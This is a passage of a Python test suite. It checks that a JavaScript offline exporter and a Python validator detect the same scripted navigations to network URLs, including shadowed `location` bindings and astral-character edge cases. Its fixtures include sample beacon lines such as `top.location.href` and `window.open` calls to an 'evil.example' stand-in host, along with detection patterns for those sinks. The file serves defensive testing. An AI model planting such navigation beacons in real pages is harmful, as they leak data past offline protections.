            names = re.search(r"^const %s = \[(.+?)\];$" % re.escape(js_name), source, re.MULTILINE)
            self.assertIsNotNone(
                names, "the runtime no longer defines %s as a single-line array; the parity "
                       "extraction is stale" % js_name)
            self.assertEqual(
                tuple(re.findall(r'"([^"]+)"', names.group(1))), tuple(getattr(resources, py_name)),
                "the exporter's %s and the validator's %s have diverged" % (js_name, py_name))
        for js_helper, py_helper in (
                ("_offlineShadowIdentChar", "_offline_shadow_ident_char"),
                ("_offlineShadowSkipComment", "_offline_shadow_skip_comment"),
                ("_offlineShadowNextSig", "_offline_shadow_next_sig"),
                ("_offlineShadowNextWord", "_offline_shadow_next_word"),
                ("_offlineShadowSkipQuoted", "_offline_shadow_skip_quoted"),
                ("_offlineShadowSkipTemplate", "_offline_shadow_skip_template"),
                ("_offlineShadowSkipRegex", "_offline_shadow_skip_regex"),
                ("_offlineShadowLineEnd", "_offline_shadow_line_end"),
                ("_offlineShadowRegexOk", "_offline_shadow_regex_ok"),
                ("_offlineShadowDeclStarts", "_offline_shadow_decl_starts"),
                ("_offlineLocalLocationShadow", "offline_local_location_shadow")):
            self.assertIn("function %s(" % js_helper, source,
                          "the exporter no longer defines %s, so the two scanners are no longer "
                          "the same scanner" % js_helper)
            self.assertTrue(hasattr(resources, py_helper),
                            "the validator no longer defines %s, so the two scanners are no longer "
                            "the same scanner" % py_helper)
        depth = re.search(r"^const _OFFLINE_SHADOW_MAX_DEPTH = (\d+);$", source, re.MULTILINE)
        self.assertIsNotNone(depth,
                             "the runtime no longer defines _OFFLINE_SHADOW_MAX_DEPTH as a "
                             "single-line constant; the parity extraction is stale")
        self.assertEqual(int(depth.group(1)), resources.OFFLINE_SHADOW_MAX_DEPTH,
                         "the exporter and the validator cap the frame stack at different depths, "
                         "so a deeply nested script would be read differently by each")

    # The bounded window the tokenizer replaced ran from the declaration OPENER to the `location`
    # name, and each copy measured it with a string index - UTF-16 code units in JavaScript,
    # Unicode code points in Python - so an astral-bearing window was two different lengths to the
    # two engines. The padding below is therefore sized from that WINDOW rather than from itself:
    # the `/*`, the `*/` and the space between them contribute 5 units on top of the padding, so a
    # window of W code units needs W - 5 units of padding. The widths bracket the old 400 (399 and
    # 400 inside it, 401 past it), which is exactly where a code-unit bound and a code-point bound
    # part company; 500 is not a historical constant, it is a SECOND, wider bound, so the corpus is
    # not tuned to catch exactly one number (#1112). The geometry is ASSERTED below rather than
    # described here, so these counts cannot quietly stop meaning what this comment says.
    _SHADOW_ASTRAL = "\U0001F600"
    _SHADOW_WINDOW_OVERHEAD = len("/*") + len("*/ ")
    _SHADOW_WINDOW_UNITS = (399, 400, 401, 500)

    def _shadow_unit_padding(self, units, astral):
        """Padding exactly `units` UTF-16 code units wide, from astral characters or from ASCII.

        An astral character is 2 code units and 1 code point, so an astral padding is half as many
        CHARACTERS as it is units - which is the whole asymmetry this corpus exists to exercise. An
        odd width takes one ASCII character to land on it exactly.
        """
        if not astral:
            return "a" * units
        return self._SHADOW_ASTRAL * (units // 2) + "a" * (units % 2)

    @staticmethod
    def _shadow_window_widths(sample):
        """The sample's opener-to-`location` window, as (code units, code points)."""
        opener = sample.index("/*") - 1
        window = sample[opener + 1:sample.index("location", opener)]
        return sum(2 if ord(ch) > 0xFFFF else 1 for ch in window), len(window)

    def _shadow_unit_samples(self):
        """`(label, script)` pairs whose window the two index models measure differently.

        Each script DECLARES its own `location` and then assigns a network URL to an unprefixed
        one, so the correct verdict is the same for every sample: a shadow, and therefore no
        navigation. Pinning that absolute verdict as well as the cross-engine agreement is what
        stops the check passing if the two engines ever agree on the WRONG answer.
        """
        pairs = []
        for units in self._SHADOW_WINDOW_UNITS:
            for kind in ("astral", "ascii"):
                pad = self._shadow_unit_padding(units - self._SHADOW_WINDOW_OVERHEAD,
                                                kind == "astral")
                for arm, opener in (("destructuring", "var {"), ("parameters", "function f(")):
                    closer = "} = {};" if arm == "destructuring" else ") {}"
                    pairs.append(("%s/%s/%d" % (arm, kind, units),
                                  opener + "/*" + pad + "*/ location" + closer
                                  + self._NAV_SHADOW_SINK))
        return pairs

    def _shadow_unit_site_samples(self):
        """Samples for the length comparisons the CMH-OFFLINE-05 unit model enumerates as SAFE.

        Only ONE of those sites can regress: the single-token peek after a declaration keyword,
        which is safe because each engine's peek is exactly one unit OF THAT ENGINE. The others are
        unit-IMMUNE rather than merely unit-insensitive - respelling them in code points (an
        astral-aware escape advance, an `Array.from` prefix tail, an `Array.from(m[0]).length`
        anchor width) changes no verdict on any input, because what they measure is ASCII either
        way. So the peek samples below are GUARDS - each one splits the two engines under exactly
        the regression the spec row names - and the rest are ILLUSTRATIONS that the shapes are
        reached and agreed on, not tripwires.
        """
        astral = self._SHADOW_ASTRAL
        return [
            # GUARDS. The peek decides whether `var` arms binding mode, so `location` in the same
            # declaration list is a shadow only if the peek said yes. Spelling the JS peek with
            # `String.fromCodePoint` without mirroring Python splits both of these: Python keeps
            # shadow=True while node drops to shadow=False and reports a navigation.
            ("decl-peek", "var " + astral + "x, location;" + self._NAV_SHADOW_SINK),
            ("decl-peek-pattern",
             "var " + astral + "a, {location} = {};" + self._NAV_SHADOW_SINK),
            # ILLUSTRATIONS. The fixed-width escape advances in the quoted, template and regex
            # skips, including the regex character-class path, where JavaScript steps past the
            # backslash and ONE unit and Python past the whole code point.
            ("quoted-escape", 'var s = "\\' + astral + ' location";' + self._NAV_SHADOW_SINK),
            ("template-escape", "var t = `\\" + astral + " location`;" + self._NAV_SHADOW_SINK),
            ("regex-escape", "var r = /\\" + astral + "location/;" + self._NAV_SHADOW_SINK),
            ("regex-escape-in-class", "var r = /[\\" + astral + "]/;" + self._NAV_SHADOW_SINK),
            # The backwards prefix tail, reached by an astral character sitting immediately in
            # front of a chain. The anchor match WIDTH has no sample: the anchor alternatives are
            # the fixed ASCII literals `location` and `open`, so no input can put a non-ASCII
            # character inside the match it measures.
            ("prefix-tail", astral + 'top.location.href = "https://evil.example";'),
            ("prefix-tail-chain", astral + 'window.open("https://evil.example");'),
        ]

    def test_the_two_shadow_scanners_agree_on_an_astral_bearing_window(self):
        """CMH-OFFLINE-05: the unit model holds - no verdict depends on a source-distance count.

        Nothing else exercises this class. The shadow corpus beside it is entirely ASCII, where a
        JavaScript index and a Python index count the same thing, so every existing sample agrees
        by construction no matter which unit either copy measures in; and the oracle-based
        navigation checks compare each engine against a copy of the replaced pattern compiled in
        that SAME engine, which cannot see a split at all (the Python oracle and the Python scanner
        count code points together, and the JS pair counts code units together, so both agree while
        disagreeing with each other). This one runs the PYTHON verdict and the NODE verdict on the
        SAME astral-bearing sample and compares those.

        The direction this failed in costs an author content rather than letting a beacon out: the
        validator saw the local binding and accepted the document while the exporter saw none, read
        the unprefixed sink beside it as the document's own `location`, and DELETED the script.
        """
        samples = self._shadow_unit_samples()
        for label, sample in samples:
            with self.subTest(geometry=label):
                units, points = self._shadow_window_widths(sample)
                self.assertEqual(
                    units, int(label.rsplit("/", 1)[1]),
                    "%s does not have the window width its label claims, so the corpus no longer "
                    "brackets the bound it was built to bracket" % label)
                if "/astral/" in label:
                    self.assertLess(
                        points, units,
                        "%s is meant to be measured DIFFERENTLY by the two index models, but its "
                        "window is the same width in code points and code units" % label)
                else:
                    self.assertEqual(
                        points, units,
                        "%s is the ASCII control, so both index models must measure it identically"
                        % label)
        # The absolute verdict is Python-only, so it is pinned BEFORE the node skip below: on a
        # machine without node the cross-engine half cannot run, but this half still stops the
        # corpus from agreeing on the wrong answer.
        #
        # The ASCII samples are a CONTROL, not a confirmation: an ASCII input agrees across the two
        # engines whatever unit either copy measures in, so they cannot fail from a unit-model
        # regression. What they do pin is that the window WIDTH decides nothing - the same verdict
        # at 399, 400, 401 and 500 - which is the observable form of criterion 4 ("no ASCII input
        # changes verdict"); the stronger argument for that criterion is that no shipped code
        # changed at all.
        for label, sample in samples:
            with self.subTest(verdict=label):
                self.assertTrue(
                    resources.offline_local_location_shadow(sample),
                    "%s declares its own `location`, so reporting no shadow would delete a script "
                    "that navigates nothing" % label)
                self.assertFalse(
                    resources.offline_script_navigates_to_network(sample),
                    "%s declares a `location` of its own, so the shadow rule measures it against "
                    "the PREFIXED sinks only and the unprefixed sink beside it must not count"
                    % label)
        node = shutil.which("node")
        if not node:
            # CI sets CMH_REQUIRE_NODE because it PROVISIONS node (see the plugin-tests workflow):
            # there, a missing interpreter means the provisioning step was dropped, and skipping
            # would let a required check go green having run none of the cross-engine guards.
            if os.environ.get("CMH_REQUIRE_NODE"):
                self.fail("CMH_REQUIRE_NODE is set but node is not on PATH, so the cross-engine "
                          "parity guards would silently skip on a runner that is meant to provide "
                          "node")
            self.skipTest("node is not on PATH; the cross-engine half of this check needs it")
        cross = samples + self._shadow_unit_site_samples()
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(s=>["
            "_offlineScriptNavigatesToNetwork(s),_offlineLocalLocationShadow(s)])));});"
        )
        verdicts = self._run_nav_node(node, script, [sample for _, sample in cross],
                                      "the astral-bearing local-binding windows")
        self.assertEqual(len(verdicts), len(cross),
                         "node returned %d verdicts for %d unit samples"
                         % (len(verdicts), len(cross)))
        for (label, sample), (js_navigates, js_shadow) in zip(cross, verdicts):
            with self.subTest(parity=label):
                self.assertEqual(
                    resources.offline_local_location_shadow(sample), js_shadow,
                    "the two engines disagree about the local binding in %s: node says shadow=%s. "
                    "A decision that depends on a character COUNT reads a supplementary code point "
                    "as 1 to Python and 2 to JavaScript, which is the split CMH-OFFLINE-05's unit "
                    "model forbids." % (label, js_shadow))
                self.assertEqual(
                    resources.offline_script_navigates_to_network(sample), js_navigates,
                    "the two engines disagree about %s: node says navigates=%s, so the exporter "
                    "and `--strict` would treat the same document differently"
                    % (label, js_navigates))

    def test_neither_shadow_scanner_bounds_a_span_of_source_text(self):
        """CMH-OFFLINE-05: the FORBIDDEN shape cannot reappear without a deliberate decision.

        The corpus beside this pins the unit model at the widths it was built around, which is what
        catches a bound near those magnitudes - but no finite corpus can bracket an arbitrary future
        bound, so a mirrored 600-unit window would leave every sample on the same side in both
        engines and this suite would stay green while astral input around 600 diverged again.

        So the general ban is enforced against the SOURCE instead, in the two spellings the bug has
        actually worn: a bounded regex quantifier over a run of source (the pre-#1106 window,
        `[^}\\]]{0,399}`), and a subtraction of two source positions used in a comparison (its
        replacement, `at - opener > _OFFLINE_LOCAL_WINDOW_MAX + 1`). Both measure a span of
        arbitrary source text in whichever unit the engine indexes in, which is exactly what the
        unit model forbids. Anything genuinely safe earns an entry here and a class in the spec row
        - a deliberate, reviewed act rather than a line that slips in.
        """
        allowed = {
            # The anchor match WIDTH that selects the sink arm. Class (a): the anchor alternatives
            # are the fixed ASCII literals `location` and `open`, so this is the width of an ASCII
            # token and is the same number in either index model.
            "after - at ==",
        }
        span = re.compile(r"[A-Za-z_$][\w$]*\s*-\s*[A-Za-z_$][\w$]*\s*(?:[<>]=?|[=!]==?)")
        quantifier = re.compile(r"\{\d*,\s*\d+\}")
        for name, source in (("the exporter", self._read("68-export-offline.js")),
                             ("the validator", _read_validator_resources())):
            region = self._offline_scanner_region(name, source)
            for m in span.finditer(region):
                text = " ".join(m.group(0).split())
                self.assertTrue(
                    any(text.startswith(ok) for ok in allowed),
                    "%s now compares the DISTANCE between two source positions (%r). A JavaScript "
                    "index counts UTF-16 code units and a Python index counts code points, so a "
                    "span measured this way is two different lengths to the two copies - the exact "
                    "shape of #1112. Spell the bound in UTF-16 code units on BOTH sides and add it "
                    "to the allowlist here with a class in the CMH-OFFLINE-05 unit model, or do "
                    "not bound the span." % (name, text))
            for m in quantifier.finditer(region):
                self.fail(
                    "%s now bounds a run of source with the quantifier %s. That is the ORIGINAL "
                    "spelling of #1112 (`[^}\\]]{0,399}`): the two engines count the run in "
                    "different units, so the same window is two different lengths to them. See the "
                    "CMH-OFFLINE-05 unit model." % (name, m.group(0)))

    def _offline_scanner_region(self, name, source):
        """The offline navigation and shadow scanners, without the rest of their file.

        Bounded so the guard above judges the mirrored pair rather than every unrelated helper that
        happens to share the file - a false red there would teach a maintainer to widen the
        allowlist, which is the opposite of what it exists to do.
        """
        for start_marker, end_marker in (
                ("const _OFFLINE_NAV_ANCHOR_RE = ", "function _offlineScriptNavigatesToNetwork"),
                ("OFFLINE_SHADOW_IDENT_ASCII_RE = ", "def offline_script_navigates_to_network")):
            start = source.find(start_marker)
            if start < 0:
                continue
            end = source.find(end_marker, start)
            self.assertGreater(
                end, start,
                "%s no longer defines %s after %s, so this guard would scan the wrong region"
                % (name, end_marker, start_marker))
            return source[start:end]
        self.fail("could not find the offline scanner region in %s, so the source guard would "
                  "scan nothing and pass vacuously" % name)

    def test_the_spec_declares_the_shadow_scanners_unit_model(self):
        """CMH-OFFLINE-05: the unit the two copies measure in is WRITTEN DOWN, not implicit.

        The scanners are hand-mirrored in two languages whose string indices count different
        things, so the rule that keeps them equivalent has to live somewhere a future author adding
        a bound will read. Leaving it implicit is what let the two copies disagree for as long as
        the bounded window existed.
        """
        row = _spec_row("CMH-OFFLINE-05")
        self.assertTrue(row, "CMH-OFFLINE-05 has no row in dev/spec/40-content.md")
        # The prose phrases are matched case-insensitively: their capitalization is a house
        # emphasis convention, so a copyedit that lowercases one is not a change of decision and
        # must not red this check. The identifiers and the test name are matched exactly, because
        # those ARE the thing being named.
        lowered = row.lower()
        for phrase in ("unit model", "unit-insensitive", "utf-16 code units", "code points",
                       "distance"):
            self.assertIn(
                phrase, lowered,
                "CMH-OFFLINE-05 must state '" + phrase + "' so the unit the two scanners measure "
                "in is a recorded decision rather than an accident of two languages.")
        # Every surviving length comparison the model declares SAFE has to be named, so a future
        # author can audit the list instead of rediscovering the sites one regression at a time.
        # The names are then checked against the SOURCE, so a rename cannot leave the row pointing
        # at a site that no longer exists - the spec going stale is the failure mode that makes an
        # enumeration worse than no enumeration.
        sites = {
            "OFFLINE_NAV_PREFIX_MAX": (self._read("68-export-offline.js"), "the exporter"),
            "_offlineShadowDeclStarts": (self._read("68-export-offline.js"), "the exporter"),
            "OFFLINE_SHADOW_MAX_DEPTH": (_read_validator_resources(), "the validator"),
            "_offline_shadow_decl_starts": (_read_validator_resources(), "the validator"),
        }
        for name, (source, where) in sites.items():
            self.assertIn(
                name, row,
                "CMH-OFFLINE-05 must name " + name + ": the unit model claims every surviving "
                "length comparison is unit-insensitive, and an unnamed one is a claim nobody can "
                "check.")
            self.assertIn(
                name, source,
                "CMH-OFFLINE-05 names " + name + " as one of the length comparisons it vouches "
                "for, but " + where + " no longer defines it - so the enumeration is now pointing "
                "at a site that does not exist.")
        self.assertIn(
            "test_the_two_shadow_scanners_agree_on_an_astral_bearing_window", row,
            "CMH-OFFLINE-05 must name the test that pins the unit model behaviourally; the prose "
            "is the decision, but that test is the enforcement.")

    # The regex literals and name lists the exporter's navigation SCAN is built from, each paired
    # with the validator constant that must mirror it byte for byte, and with the JS flags it must
    # carry. The scan replaced a single repeated-prefix pattern (see `_offlineNavSinkIndex`), so
    # what is SHARED is now the anchor, the three anchored tails and the character classes; the
    # walk that joins them is pinned by running the exporter's own source in node, below.
    _NAV_PATTERN_NAMES = (
        ("_OFFLINE_NAV_ANCHOR_RE", "OFFLINE_NAV_ANCHOR_RE", "gi"),
        ("_OFFLINE_NAV_PROP_TAIL_RE", "OFFLINE_NAV_PROP_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_ASSIGN_TAIL_RE", "OFFLINE_NAV_ASSIGN_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_OPEN_TAIL_RE", "OFFLINE_NAV_OPEN_TAIL_RE", "iy"),
        ("_OFFLINE_NAV_WS_RE", "OFFLINE_NAV_WS_RE", ""),
        ("_OFFLINE_NAV_IDENT_RE", "OFFLINE_NAV_IDENT_RE", ""),
        ("_OFFLINE_NAV_STATEMENT_RE", "OFFLINE_NAV_STATEMENT_RE", ""),
        ("_OFFLINE_NAV_LINE_BREAK_RE", "OFFLINE_NAV_LINE_BREAK_RE", ""),
        ("_OFFLINE_SHADOW_IDENT_ASCII_RE", "OFFLINE_SHADOW_IDENT_ASCII_RE", ""),
    )

    def _runtime_nav_pattern(self, name, flags=None):
        """One of the navigation scan's regex SOURCES, extracted from the runtime partial."""
        source = self._read("68-export-offline.js")
        m = re.search(r"^const %s = /(.+)/([a-z]*);$" % re.escape(name), source, re.MULTILINE)
        self.assertIsNotNone(
            m, "the runtime no longer defines %s as a single-line regex literal; the parity "
               "extraction is stale" % name)
        if flags is not None:
            self.assertEqual(
                m.group(2), flags,
                "the runtime's %s carries the flags /%s rather than /%s. A tail that loses its "
                "sticky `y` would SEARCH forward from the anchor instead of matching AT it, which "
                "both widens the shapes it accepts and reopens the quadratic scan this replaced."
                % (name, m.group(2), flags))
        return m.group(1)

    def _runtime_nav_source(self):
        """The exporter's whole navigation decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than re-implemented in Python: the decision is
        now a SCAN (anchor pass, three anchored tails, the backwards prefix-chain walk and the
        statement-start rule, plus the local-binding shadow rule), and a Python re-implementation
        would keep passing after any of those drifted - which is exactly the drift this test
        exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("const _OFFLINE_NAV_ANCHOR_RE = ")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _OFFLINE_NAV_ANCHOR_RE; the parity "
                            "extraction is stale")
        end = source.find("function _offlineScriptNavigatesToNetwork(body) {", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineScriptNavigatesToNetwork after "
                            "the navigation constants; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1,
                            "could not find the end of _offlineScriptNavigatesToNetwork")
        region = source[start:end + 2]
        for name in ("_offlineNavAsciiLower", "_offlineNavPrefixStart", "_offlineNavChainOk",
                     "_offlineNavStatementStart", "_offlineNavSinkIndex",
                     "_offlineLocalLocationShadow"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted navigation region, so the parity "
                          "check would run a partial copy of the decision" % name)
        return region

    # The pattern the scan replaced, frozen here as an ORACLE. It is deliberately a copy rather
    # than an import: the point of `test_the_navigation_scan_matches_the_pattern_it_replaced` is
    # that a hand-written scan recognizes exactly what the regex did, and an oracle that moved with
    # the code would assert nothing. Update it only when the recognized SHAPES change on purpose,
    # in the same commit that changes them.
    _LEGACY_NAV_WS = (r"[ \t\n\r\f\v\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000"
                      r"\ufeff]")
    _LEGACY_NAV_CHAIN = (r"(?:(?:window|self|top|parent|globalThis|document|frames)" + _LEGACY_NAV_WS
                         + r"*(?:\?" + _LEGACY_NAV_WS + r"*)?\." + _LEGACY_NAV_WS + r"*)")
    # The URL tail moved with #914: it now also accepts the spellings a browser or the JavaScript
    # parser NORMALIZES into a network URL (padding the URL parser strips, a tab/LF/CR inside the
    # scheme or between the slashes, a backslash authority, a LineContinuation, and an escaping
    # backslash before any literal element). The oracle carries the same tail so it keeps testing
    # the SCAN's structure rather than re-testing the widening.
    _LEGACY_NAV_URL = (_LEGACY_NAV_WS + r"""*["'`](?:\\?[\u0001-\u0020]|\\[\u2028\u2029])*"""
                       r"(?:\\?h(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?t(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?t(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"\\?p(?:\\?[\t\n\r]|\\[\u2028\u2029])*"
                       r"(?:\\?s(?:\\?[\t\n\r]|\\[\u2028\u2029])*)?\\?:"
                       r"|(?:\\?\/|\\\\)(?:\\?[\t\n\r]|\\[\u2028\u2029])*(?:\\?\/|\\\\))")
    _LEGACY_NAV_PROP = (r"location" + _LEGACY_NAV_WS + r"*(?:\?" + _LEGACY_NAV_WS + r"*)?\."
                        + _LEGACY_NAV_WS + r"*(?:href" + _LEGACY_NAV_WS + r"*=(?!=)"
                        r"|(?:assign|replace)" + _LEGACY_NAV_WS + r"*\()")
    _LEGACY_NAV_BARE = (r"(?:location" + _LEGACY_NAV_WS + r"*=(?!=)|open" + _LEGACY_NAV_WS + r"*\()")
    # The boundary in front of a chain. It moved with #1056: a JavaScript identifier is not ASCII,
    # so the ASCII-only class read every non-ASCII identifier character as a boundary and made a
    # purely local `<non-ASCII letter>location` the document's own sink. The oracle carries the same
    # widened class, because its job is to pin the SCAN's structure rather than to re-litigate which
    # characters end an identifier.
    _LEGACY_NAV_BOUNDARY = (r"[\u0000-\u0023\u0025-\u002d\u002f\u003a-\u0040\u005b-\u005e\u0060"
                            r"\u007b-\u007f\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000"
                            r"\ufeff]")
    _LEGACY_NAV_BOUNDARY_RE = re.compile(_LEGACY_NAV_BOUNDARY, re.ASCII)
    _LEGACY_NAV_FULL = re.compile(
        r"(?:(?:^|" + _LEGACY_NAV_BOUNDARY + r")" + _LEGACY_NAV_CHAIN + r"*" + _LEGACY_NAV_PROP
        + r"|(?:^|" + _LEGACY_NAV_BOUNDARY + r")" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_BARE
        + r"|(?:^|[;})>\n\r\u2028\u2029])" + _LEGACY_NAV_WS + r"*location" + _LEGACY_NAV_WS
        + r"*=(?!=))" + _LEGACY_NAV_URL, re.IGNORECASE | re.ASCII)
    _LEGACY_NAV_PREFIXED = re.compile(
        r"(?:(?:^|" + _LEGACY_NAV_BOUNDARY + r")" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_PROP
        + r"|(?:^|" + _LEGACY_NAV_BOUNDARY + r")" + _LEGACY_NAV_CHAIN + r"+" + _LEGACY_NAV_BARE
        + r")" + _LEGACY_NAV_URL, re.IGNORECASE | re.ASCII)

    # Fragments crossed into a corpus of sinks and NEAR-sinks: a boundary character, a prefix
    # chain, a sink spelling, an operator and a URL literal. The interesting cells are the ones
    # that only ALMOST match - `cfg.` in front, a chain that ends in whitespace (which is itself a
    # legal boundary, so a shorter chain matches where the longest does not), `windows.` and
    # `locations.href`, `==` rather than `=`, and a relative URL.
    _NAV_CROSS_HEADS = ("", "$", ";", "\n", " ", "x", ".", "cfg.", "\u00e9")
    _NAV_CROSS_CHAINS = ("", "window.", "window . ", "globalThis?. ", "top.window.", "windows.",
                         "frames . ? . ", "document.")
    _NAV_CROSS_SINKS = ("location.href", "LOCATION . href", "location?.href", "location.assign",
                        "location", "open", "locations.href", "location.replace")
    _NAV_CROSS_OPS = ("=", " = ", "==", "(", "")
    _NAV_CROSS_URLS = ('"https://x"', "`https:`", '"./a"', '" https://x"')

    def test_the_python_and_js_scripted_navigation_patterns_agree(self):
        """The offline strip (JS) and the strict validator (Python) must recognize the SAME
        scripted top-level navigations.

        Top-level navigation is the one egress channel the offline CSP cannot close (`navigate-to`
        was dropped from CSP Level 3 and ships nowhere; `sandbox` is ignored in a meta-delivered
        policy), so this check is not defense in depth behind a boundary - for that channel it IS
        the check. Two independent copies of it are exactly the drift the runnable-script-type
        parity test above exists for: a validator that recognized less would certify an offline file
        the exporter no longer protects, and one that recognized more would reject the file the
        exporter just produced.

        Every literal the scan is built from is pinned by TEXT equality, not by re-deriving one from
        the other. That is the only pin that survives the engines disagreeing: `\\w` is ASCII-only
        in JS but Unicode-aware in Python, and JS whitespace includes U+FEFF while Python's does
        not, so a pattern that merely LOOKS shared can still behave differently. The WALK around
        those literals cannot be pinned by text at all, so
        `test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine` runs the exporter's own
        source in node over the same corpus.
        """
        for js_name, py_name, flags in self._NAV_PATTERN_NAMES:
            runtime_pattern = self._runtime_nav_pattern(js_name, flags)
            compiled = getattr(resources, py_name)
            self.assertEqual(
                runtime_pattern, compiled.pattern,
                "the exporter's %s literal and the validator's %s pattern text have diverged. They "
                "must be byte-identical (Python reads the JS-only `\\/` escape as a literal `/` "
                "too), because a validator that recognizes less certifies a file the exporter no "
                "longer protects, and one that recognizes more rejects the file the exporter just "
                "produced." % (js_name, py_name))
            # `re.ASCII` is part of the contract, not an implementation detail: without it Python's
            # IGNORECASE folds several non-ASCII letters onto ASCII ones that JS's `/i` does not, so
            # the validator would reject source the exporter preserves.
            self.assertTrue(
                compiled.flags & re.ASCII,
                "the validator's %s must be compiled with re.ASCII, or Python's Unicode "
                "case-folding (dotless i, long s, Kelvin sign) makes it match identifiers the JS "
                "engine - and therefore the exporter - does not" % py_name)
            self.assertEqual(
                bool(compiled.flags & re.IGNORECASE), "i" in flags,
                "the validator's %s and the exporter's %s disagree about case sensitivity"
                % (py_name, js_name))
            # Guard the spelled-out classes: re-introducing a shared shorthand silently
            # reintroduces the cross-engine divergence, and text equality alone would not notice.
            # Every ASCII-vs-Unicode shorthand is banned, not just the two that actually bit.
            for shared in (r"\s", r"\S", r"\w", r"\W", r"\d", r"\D", r"\b", r"\B"):
                self.assertNotIn(
                    shared, runtime_pattern,
                    "%s uses %r, whose meaning DIFFERS between the JS and Python regex engines "
                    "(ASCII vs Unicode `\\w`/`\\d`; U+FEFF is JS whitespace but not Python's). "
                    "Spell the class out in both copies instead." % (js_name, shared))

        # The prefix chain is walked in code now, so its NAME LIST is shared data rather than part
        # of a pattern - a name only one side knows about is a sink the strip drops and the gate
        # blesses, or the reverse.
        names = re.search(r"^const _OFFLINE_NAV_PREFIX_NAMES = \[(.+?)\];$",
                          self._read("68-export-offline.js"), re.MULTILINE)
        self.assertIsNotNone(names,
                             "the runtime no longer defines _OFFLINE_NAV_PREFIX_NAMES as a "
                             "single-line array; the parity extraction is stale")
        self.assertEqual(
            tuple(re.findall(r'"([^"]+)"', names.group(1))),
            tuple(resources.OFFLINE_NAV_PREFIX_NAMES),
            "the exporter's _OFFLINE_NAV_PREFIX_NAMES and the validator's "
            "OFFLINE_NAV_PREFIX_NAMES have diverged")

        for sample in self._NAV_CORPUS_NAVIGATES:
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator no longer rejects %r" % sample)
        for sample in self._NAV_CORPUS_BENIGN:
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                             "the validator now rejects the benign script %r" % sample)

    # The astral samples the code-point sweep below adds to its BMP range. A supplementary code
    # point is a surrogate PAIR to `charAt` and ONE code point to Python, so it is the only place
    # the two engines read the same source differently by construction; the sweep is what proves
    # the class settles it the same way in both rather than the comment claiming it.
    _NAV_IDENT_ASTRAL = (0x10000, 0x1d425, 0x1f600, 0x20000, 0x10fffd, 0x10ffff)

    def _nav_ident_expected(self, ch):
        """Whether `ch` MUST read as an identifier character, derived from the two ideas the class
        encodes rather than from the class itself: within ASCII the identifier set is the scan's own
        `[.A-Za-z0-9_$]` (the `.` is in it on purpose - a member-expression dot CONTINUES a chain,
        which is what keeps `cfg.location.href = <url>` benign), and outside ASCII everything is an
        identifier character except what the scan already calls WHITESPACE."""
        if ord(ch) < 0x80:
            return bool(re.match(r"[.A-Za-z0-9_$]", ch))
        return not resources.OFFLINE_NAV_WS_RE.match(ch)

    def test_the_navigation_boundary_class_covers_every_code_point(self):
        """Sweep the identifier/boundary split over every code point, not over a few samples.

        The curated corpora put a handful of exotic spaces in the boundary slot, which is enough to
        catch the carve-out being deleted wholesale but NOT enough to catch ONE range going missing:
        dropping `\\u2000-\\u200a` from either copy leaves every sample-based navigation test green
        while a real `<U+2000>location.href = <url>` stops being seen. The split is a closed,
        enumerable property, so enumerate it - against the WHITESPACE class the scan already uses,
        so the two can never drift apart silently either.

        The frozen legacy oracle's boundary class is swept in the same pass. It is the complement of
        this one by construction, and an oracle that is only ALMOST the complement would make the
        equivalence test assert something subtly different from what the scan does.
        """
        points = list(range(0x0000, 0x10000)) + list(self._NAV_IDENT_ASTRAL)
        for code in points:
            ch = chr(code)
            expected = self._nav_ident_expected(ch)
            self.assertEqual(
                bool(resources.OFFLINE_NAV_IDENT_RE.match(ch)), expected,
                "OFFLINE_NAV_IDENT_RE disagrees about U+%04X: within ASCII the identifier set is "
                "exactly `[.A-Za-z0-9_$]` (the dot included, since it continues a member "
                "expression), and outside it every character OFFLINE_NAV_WS_RE calls whitespace is "
                "a BOUNDARY while everything else reads as an identifier character"
                % code)
            self.assertEqual(
                bool(self._LEGACY_NAV_BOUNDARY_RE.match(ch)), not expected,
                "the frozen oracle's boundary class is not the exact complement of the scan's "
                "identifier class at U+%04X, so the equivalence test is comparing the scan against "
                "a slightly different rule than the one it implements" % code)

        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine sweep needs it")
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(function(c){"
            "const s=String.fromCodePoint(c);"
            "return s.split('').map(u=>_OFFLINE_NAV_IDENT_RE.test(u));})));});"
        )
        verdicts = self._run_nav_node(node, script, points, "the identifier-class code-point sweep")
        self.assertEqual(len(verdicts), len(points),
                         "node returned %d verdicts for %d code points"
                         % (len(verdicts), len(points)))
        for code, units in zip(points, verdicts):
            expected = self._nav_ident_expected(chr(code))
            # An astral code point reaches `charAt` as a surrogate PAIR, so BOTH units have to land
            # on the same side as Python's single code point or the two engines part company on the
            # very inputs this class was widened for.
            for unit in units:
                self.assertEqual(
                    unit, expected,
                    "the REAL JS engine and the validator disagree about U+%04X, so a script the "
                    "exporter keeps is one the gate rejects (or the reverse)" % code)

    def _run_nav_node(self, node, script, payload, what, timeout=180):
        """Evaluate the extracted navigation source in node, failing rather than hanging.

        A timeout is not belt and braces here: the shape these checks exist to catch is a scan that
